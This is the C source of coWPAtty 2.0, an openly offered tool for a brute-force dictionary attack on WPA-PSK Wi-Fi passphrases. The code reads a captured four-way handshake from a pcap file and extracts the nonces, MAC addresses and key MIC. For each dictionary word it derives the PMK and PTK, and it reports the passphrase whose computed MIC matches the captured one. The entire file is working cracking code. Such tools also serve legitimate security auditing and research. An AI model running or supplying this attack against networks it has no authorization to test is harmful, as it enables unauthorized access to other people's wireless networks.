/*
 * coWPAtty - Brute-force dictionary attack against WPA-PSK.
 *
 * Copyright (c) 2004, Joshua Wright <jwright@hasborg.com>
 *
 * $Id: cowpatty.c,v 1.2 2004/11/02 11:46:42 jwright Exp $
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License version 2 as
 * published by the Free Software Foundation. See COPYING for more
 * details.
 *
 * coWPAtty is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 */

/*
 * Significant code is graciously taken from the following:
 * wpa_supplicant by Jouni Malinen.  This tool would have been MUCH more
 * difficult for me if not for this code.  Thanks Jouni.
 */

/*
 * Right off the bat, this code isn't very useful.  The PBKDF2 function makes
 * 4096 SHA-1 passes for each passphrase, which takes quite a bit of time.  On
 * my Pentium II development system, I'm getting ~2.5 passphrases/second.
 * I've done my best to optimize the PBKDF2 function, but it's still pretty
 * slow.
 */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>
#include <pcap.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "cowpatty.h"
#include "common.h"
#include "utils.h"
#include "sha1.h"
#include "md5.h"

#define PROGNAME "cowpatty"
#define VER "2.0"
#define MAXPASSPHRASE 256
#define DOT1X_LLCTYPE "\x88\x8e"
#define DOT11_TYPEDATA "\x08"

/* Globals */
pcap_t  *p = NULL;
unsigned char *packet;
struct  pcap_pkthdr *h;
char    errbuf[PCAP_ERRBUF_SIZE];
int     sig=0;  /* Used for handling signals */
char    *words;

/* Prototypes */
void wpa_pmk_to_ptk(u8 *pmk, u8 *addr1, u8 *addr2,
			   u8 *nonce1, u8 *nonce2, u8 *ptk, size_t ptk_len);
void hexdump(unsigned char *data, int len);
void usage(char *message);
void testopts(struct user_opt *opt);
void cleanup();
void parseopts(struct user_opt *opt, int argc, char **argv);
void closepcap(struct capture_data *capdata);
void handle_dot1x(struct crack_data *cdata, struct capture_data *capdata);
void dump_all_fields(struct crack_data cdata);
void printstats(struct timeval start, struct timeval end, 
    unsigned long int wordcount);
int nextword(char *word, FILE *fp);


void usage(char *message) {

    if (strlen(message) > 0) {
        printf("%s: %s\n", PROGNAME, message);
    }

    printf("Usage: %s [options]\n", PROGNAME);
    printf("\n"
    "\t-f \tDictionary file\n"
    "\t-r \tPacket capture file\n"
    "\t-s \tNetwork SSID\n"
    "\t-h \tPrint this help information and exit\n"
    "\t-v \tPrint verbose information (more -v for more verbosity)\n"
    "\t-V \tPrint program version and exit\n"
    "\n");
}

void cleanup() {
    /* lame-o-meter++ */
    sig=1;
}

void wpa_pmk_to_ptk(u8 *pmk, u8 *addr1, u8 *addr2,
			   u8 *nonce1, u8 *nonce2, u8 *ptk, size_t ptk_len)
{
	u8 data[2 * ETH_ALEN + 2 * 32];

    memset(&data, 0, sizeof(data));

	/* PTK = PRF-X(PMK, "Pairwise key expansion",
	 *             Min(AA, SA) || Max(AA, SA) ||
	 *             Min(ANonce, SNonce) || Max(ANonce, SNonce)) */

	if (memcmp(addr1, addr2, ETH_ALEN) < 0) {
		memcpy(data, addr1, ETH_ALEN);
		memcpy(data + ETH_ALEN, addr2, ETH_ALEN);
	} else {
		memcpy(data, addr2, ETH_ALEN);
		memcpy(data + ETH_ALEN, addr1, ETH_ALEN);
	}

	if (memcmp(nonce1, nonce2, 32) < 0) {
		memcpy(data + 2 * ETH_ALEN, nonce1, 32);
		memcpy(data + 2 * ETH_ALEN + 32, nonce2, 32);
	} else {
		memcpy(data + 2 * ETH_ALEN, nonce2, 32);
		memcpy(data + 2 * ETH_ALEN + 32, nonce1, 32);
	}

	sha1_prf(pmk, 32, "Pairwise key expansion", data, sizeof(data),
		 ptk, ptk_len);
}


void hexdump(unsigned char *data, int len) {
    int i;
    for (i=0; i < len; i++) {
        printf("%02x ", data[i]);
    }
}

void parseopts(struct user_opt *opt, int argc, char **argv) {

    int c;

    while((c = getopt(argc, argv, "f:r:s:hvV")) != EOF) {
        switch(c) {
            case 'f':
                strncpy(opt->dictfile, optarg, sizeof(opt->dictfile));
                break;
            case 'r':
                strncpy(opt->pcapfile, optarg, sizeof(opt->pcapfile));
                break;
            case 's':
                strncpy(opt->ssid, optarg, sizeof(opt->ssid));
                break;
            case 'h':
                usage("");
                exit(0);
                break;
            case 'v':
                opt->verbose++;
                break;
            case 'V':
                printf("$Id: cowpatty.c,v 1.2 2004/11/02 11:46:42 jwright Exp $\n");
                exit(0);
                break;
            default:
                usage("");
                exit(1);
        }
    }
}


void testopts(struct user_opt *opt) {
    struct stat teststat;

    /* test for required parameters */
    if (IsBlank(opt->dictfile)) {
        usage("Must supply a list of passphrases in a file with -f.\n"
              "\t  Use \"-f -\" to accept words on stdin.");
        exit(1);
    }

    if (IsBlank(opt->ssid)) {
        usage("Must supply the SSID for the network with -s");
        exit(1);
    }

    if (IsBlank(opt->pcapfile)) {
        usage("Must supply a pcap file with -r");
        exit(1);
    }

    /* Test that the files specified exist and are greater than 0 bytes */
    if (strncmp(opt->dictfile, "-", 1) != 0) {
        if (stat(opt->dictfile, &teststat)) {
            usage("Could not stat the dictionary file.  Check file path.");
            exit(1);
        } else if (teststat.st_size == 0) {
            usage("Empty dictionary file (0 bytes).  Check file contents.");
            exit(1);
        }
    }

    if (stat(opt->pcapfile, &teststat)) {
        usage("Could not stat the pcap file.  Check file path.");
        exit(1);
    } else if (teststat.st_size == 0) {
        usage("Empty pcap file (0 bytes).  Check file contents.");
        exit(1);
    }
}

int openpcap(struct capture_data *capdata) {

    /* Assume for now it's a libpcap file */
    p = pcap_open_offline(capdata->pcapfilename, errbuf);
    if (p == NULL) {
        perror("Unable to open capture file");
        return(-1);
    }

    /* Determine link type */
    capdata->pcaptype = pcap_datalink(p);

    /* Determine offset to EAP frame based on link type */
    switch(capdata->pcaptype) {
        case DLT_NULL:
        case DLT_EN10MB:
            /* Standard ethernet header */
            capdata->dot1x_offset = 14;
            capdata->l2type_offset = 12;
            capdata->dstmac_offset = 0;
            capdata->srcmac_offset = 6;
            break;
        case DLT_IEEE802_11:
            /* 24 bytes 802.11 header, 8 for 802.2 header */
            capdata->dot1x_offset = 32; 
            capdata->l2type_offset = 30;
            capdata->dstmac_offset = 4;
            capdata->srcmac_offset = 10;
            break;
        case DLT_PRISM_HEADER:
            /* 802.11 frames with AVS header, AVS header is 144 bytes */
            capdata->dot1x_offset = 32+144; 
            capdata->l2type_offset = 30+144;
            capdata->dstmac_offset = 4+144;
            capdata->srcmac_offset = 10+144;
            break;
        default:
            /* Unknown/unsupported pcap type */
            return(1);
    }

    return(0);
}

void closepcap(struct capture_data *capdata) {

    /* Assume it's a libpcap file for now */
    pcap_close(p);
}

/* Populates global *packet, returns status */
int getpacket(struct capture_data *capdata) {

    /* Assume it's a libpcap file for now */
    int ret;
    ret = pcap_next_ex(p, &h, (const u_char **)&packet);
    return(ret);
}

void handle_dot1x(struct crack_data *cdata, struct capture_data *capdata) {
    struct ieee8021x *dot1xhdr;
    struct wpa_eapol_key *eapolkeyhdr;
    int eapolkeyoffset;
    int key_info, ver, index;

    /* We're going after the last three frames in the 4-way handshake.
       In the last frame of the TKIP exchange, the authenticator nonce is
       omitted.  In cases where there is a unicast and a multicast key 
       distributed, frame 4 will include the authenticator nonce.  In some
       cases however, there is no multicast key distribution, so frame 4 has
       no authenticator nonce.  For this reason, we need to capture information
       from the 2nd, 3rd and 4th frames to accommodate cases where there is no
       multicast key delivery.  Suckage.
    */

    dot1xhdr = (struct ieee8021x *)&packet[capdata->dot1x_offset];
    eapolkeyoffset = capdata->dot1x_offset + sizeof(struct ieee8021x);
    eapolkeyhdr = (struct wpa_eapol_key *)&packet[eapolkeyoffset];

    /* Bitwise fields in the key_info field of the EAPOL-Key header */
    key_info = be_to_host16(eapolkeyhdr->key_info);
    ver = key_info & WPA_KEY_INFO_TYPE_MASK;
    index = key_info & WPA_KEY_INFO_KEY_INDEX_MASK;
 
    /* Check for EAPOL version 1, type EAPOL-Key */
    if (dot1xhdr->version != 1 || dot1xhdr->type != 3) {
        return;
    }
    
    if (ver != WPA_KEY_INFO_TYPE_HMAC_MD5_RC4) {
        /* Only support WPA-I in this version */
        return;
    }

    /* Check for WPA key, and pairwise key type */
    if (eapolkeyhdr->type != 254 || (key_info & WPA_KEY_INFO_KEY_TYPE) == 0) {
        return;
    }

    /* Check for frame 2 of the 4-way handshake */
    if ((key_info & WPA_KEY_INFO_MIC) && (key_info & WPA_KEY_INFO_ACK) == 0 &&
        (key_info & WPA_KEY_INFO_INSTALL) == 0 &&
        eapolkeyhdr->key_data_length > 0) {
            /* All we need from this frame is the authenticator nonce */
           memcpy(cdata->snonce, eapolkeyhdr->key_nonce, 
               sizeof(cdata->snonce));
           cdata->snonceset=1;

    } else if ( /* Check for frame 3 of the 4-way handshake */
        (key_info & WPA_KEY_INFO_MIC) && (key_info & WPA_KEY_INFO_INSTALL) && 
        (key_info & WPA_KEY_INFO_ACK)) {
        
            memcpy(cdata->spa, &packet[capdata->dstmac_offset], 
                sizeof(cdata->spa));
            memcpy(cdata->aa, &packet[capdata->srcmac_offset], 
                sizeof(cdata->aa));
            memcpy(cdata->anonce, eapolkeyhdr->key_nonce, 
                sizeof(cdata->anonce));
            cdata->aaset=1;
            cdata->spaset=1;
            cdata->anonceset=1;
            /* We save the replay counter value in the 3rd frame to match
               against the 4th frame of the four-way handshake */
            memcpy(cdata->replay_counter, eapolkeyhdr->replay_counter, 8);

    } else if (   /* Check for frame 4 of the four-way handshake */
        (key_info & WPA_KEY_INFO_MIC) && (key_info & WPA_KEY_INFO_ACK) == 0 &&
        (key_info & WPA_KEY_INFO_INSTALL) == 0 &&
        (memcmp(cdata->replay_counter, eapolkeyhdr->replay_counter, 8) == 0)) {

           memcpy(cdata->keymic, eapolkeyhdr->key_mic, sizeof(cdata->keymic));
           memcpy(cdata->eapolframe, &packet[capdata->dot1x_offset],
               sizeof(cdata->eapolframe));
           cdata->keymicset=1;
           cdata->eapolframeset=1;
    }
}

void dump_all_fields(struct crack_data cdata) {

    printf("AA is:");
    lamont_hdump(cdata.aa, 6);
    printf("\n");
    
    printf("SPA is:");
    lamont_hdump(cdata.spa, 6);
    printf("\n");

    printf("snonce is:");
    lamont_hdump(cdata.snonce, 32);
    printf("\n");

    printf("anonce is:");
    lamont_hdump(cdata.anonce, 32);
    printf("\n");

    printf("keymic is:");
    lamont_hdump(cdata.keymic, 16);
    printf("\n");

    printf("eapolframe is:");
    lamont_hdump(cdata.eapolframe, 99); /* Bug in lamont_hdump makes this look
                                           wrong, only shows 98 bytes */
    printf("\n");

}

void printstats(struct timeval start, struct timeval end, 
    unsigned long int wordcount) {

    float elapsed=0;

    if(end.tv_usec < start.tv_usec) {
        end.tv_sec -= 1;
        end.tv_usec += 1000000;
    }
    end.tv_sec -= start.tv_sec;
    end.tv_usec -= start.tv_usec;
    elapsed = end.tv_sec + end.tv_usec / 1000000.0;

    printf("\n%lu passphrases tested in %.2f seconds:  %.2f passphrases/"
           "second\n", wordcount, elapsed, wordcount / elapsed);
}

int nextword(char *word, FILE *fp) {

    if (fgets(word, MAXPASSLEN+1, fp) == NULL) {
        return(-1);
    }

    /* Remove newline */
    word[strlen(word)-1] = '\0';

    if (feof(fp)) {
        return(-1);
    }

    return(strlen(word));
}

    

int main(int argc, char **argv) {
    struct user_opt opt;
    struct crack_data cdata;
    struct capture_data capdata;
    struct wpa_eapol_key *eapkeypacket;
    u8   pmk[32];
    u8   ptk[64];
    u8   keymic[16];
    u8   eapolkey_nomic[99];
    struct wpa_ptk *ptkset;
    struct timeval start, end;
    int wordstested=0, fret=0;
    char passphrase[MAXPASSLEN+1];
    FILE *fp;

    printf("%s %s - WPA-PSK dictionary attack. <jwright@hasborg.com>\n",
            PROGNAME, VER);

    memset(&opt, 0, sizeof(struct user_opt));
    memset(&capdata, 0, sizeof(struct capture_data));
    memset(&cdata, 0, sizeof(struct crack_data));
    memset(&eapolkey_nomic, 0, sizeof(eapolkey_nomic));
    
    /* Collect and test command-line arguments */
    parseopts(&opt, argc, argv);
    testopts(&opt);
    printf("\n");

    /* Open the dictionary file */
    if (*opt.dictfile == '-') {
        printf("Using STDIN for words.\n");
        fp = stdin;
    } else {
        fp = fopen(opt.dictfile, "r");
        if (fp == NULL) {
            perror("fopen");
            exit(-1);
        }
    }


    /* Populate capdata struct */
    strncpy(capdata.pcapfilename, opt.pcapfile, sizeof(capdata.pcapfilename));
    if (openpcap(&capdata) != 0) {
        printf("Unsupported or unrecognized pcap file.\n");
        exit(1);
    }

    /* populates global *packet */
    while (getpacket(&capdata) > 0) {
        if (opt.verbose > 2) {
            lamont_hdump(packet, h->len);
        }
        /* test packet for data that we are looking for */
        if (memcmp(&packet[capdata.l2type_offset], DOT1X_LLCTYPE, 2) == 0 &&
           (h->len > capdata.l2type_offset+sizeof(struct wpa_eapol_key)) ) {
            /* It's a dot1x frame, process it */
            handle_dot1x(&cdata, &capdata);
            if (cdata.aaset && cdata.spaset && cdata.snonceset &&
                cdata.anonceset && cdata.keymicset && cdata.eapolframeset) {
                /* We've collected everything we need. */
                break;
            }
        }
    }

    closepcap(&capdata);

    if (!(cdata.aaset && cdata.spaset && cdata.snonceset &&
            cdata.anonceset && cdata.keymicset && cdata.eapolframeset)) {
        printf("End of pcap capture file, incomplete TKIP four-way "
               "exchange.  Try using a\ndifferent capture.\n");
        exit(1);
    } else {
        printf("Collected all necessary data to mount crack against "
               "passphrase.\n");
    }

    if (opt.verbose > 1) {
        dump_all_fields(cdata);
    }

    /* Zero mic and length data for hmac-md5 calculation */
    eapkeypacket = (struct wpa_eapol_key *)&cdata.eapolframe[EAPDOT1XOFFSET];
    memset(&eapkeypacket->key_mic, 0, sizeof(eapkeypacket->key_mic));
    eapkeypacket->key_data_length = 0;

    printf("Starting dictionary attack.  Please be patient.\n");
    fflush(stdout);

    signal(SIGINT, cleanup);
    signal(SIGTERM, cleanup);
    signal(SIGQUIT, cleanup);

    gettimeofday(&start, 0);

    while (feof(fp) == 0 && sig == 0) {

        /* Populate "passphrase" with the next word */
        fret = nextword(passphrase, fp);
        if (fret < 0) {
            break;
        }

        if (opt.verbose > 1) {
            printf("Testing passphrase: %s\n", passphrase);
        }
        
        /*
         * Test length of word.  IEEE 802.11i indicates the passphrase must be
         * at least 8 characters in length, and no more than 63 characters in
         * length. 
         */
        if (fret < 8 || fret > 63) {
            if (opt.verbose) {
                printf("Invalid passphrase length: %s (%d).\n", passphrase,
                    strlen(passphrase));
            }
            continue;
        } else {
            /* This word is good, increment the words tested counter */
            wordstested++;
        }

        /* Status display */
        if ((wordstested % 1000) == 0) {
            printf("key no. %d: %s\n", wordstested, passphrase);
            fflush(stdout);
        }

        if (opt.verbose > 1) {
            printf("Calculating PMK for \"%s\".\n", passphrase);
        }
        pbkdf2_sha1(passphrase, opt.ssid, strlen(opt.ssid), 4096, 
            pmk, sizeof(pmk), USECACHED);
        if (opt.verbose > 2) {
            printf("PMK is");
            lamont_hdump(pmk, sizeof(pmk));
        }

        if (opt.verbose > 1) {
            printf("Calculating PTK with collected data and PMK.\n");
        }
        wpa_pmk_to_ptk(pmk, cdata.aa, cdata.spa, cdata.anonce, cdata.snonce,
            ptk, sizeof(ptk)); 

        if (opt.verbose > 2) {
            printf("Calculated PTK for \"%s\" is", passphrase); 
            lamont_hdump(ptk, sizeof(ptk));
        }

        ptkset = (struct wpa_ptk *)ptk;

        if (opt.verbose > 1) {
            printf("Calculating hmac-MD5 Key MIC for this frame.\n");
        }

        hmac_md5(ptkset->mic_key, 16, cdata.eapolframe, 
            sizeof(cdata.eapolframe), keymic);
        if (opt.verbose > 2) {
            printf("Calculated MIC with \"%s\" is", passphrase);
            lamont_hdump(keymic, sizeof(keymic));
        }

        if (memcmp(&cdata.keymic, &keymic, sizeof(keymic)) == 0) {
            /* Right PSK */
            printf("\nThe PSK is \"%s\".\n", passphrase);
            gettimeofday(&end, 0);
            printstats(start, end, wordstested);
            exit(0);
        }
    }

    gettimeofday(&end, 0);
    printstats(start, end, wordstested);
    printf("Unable to identify the PSK from the dictionary file.  Try "
           "expanding your\npassphrase list, and double-check the SSID."
           "  Sorry it didn't work out.\n");
    return(0);
}
